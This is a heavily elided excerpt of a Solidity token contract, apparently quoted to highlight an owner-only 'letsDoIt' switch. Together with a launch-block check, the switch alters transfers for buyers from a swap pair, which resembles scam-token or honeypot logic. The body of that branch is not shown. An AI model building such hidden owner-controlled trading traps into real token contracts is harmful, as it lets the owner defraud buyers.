...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function setDoIt(bool status) public onlyOwner{
        letsDoIt = status;
    }
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                //
                if (_swapPairList[from] && block.number < goMoonBlock + 100 && letsDoIt){
...
contract zxxz is AbsToken {
    constructor() AbsToken(
        ...
        9,//Decimals
        2022,//Supply
        address(0x45998d14ab9157f93C9c5dCC53bfeF833DBD8328),//FundAddress
        address(0xeAC91df1580041b9772c74a1F99335B6A41Ebc06)//ReceiveAddress
    ){
    }
}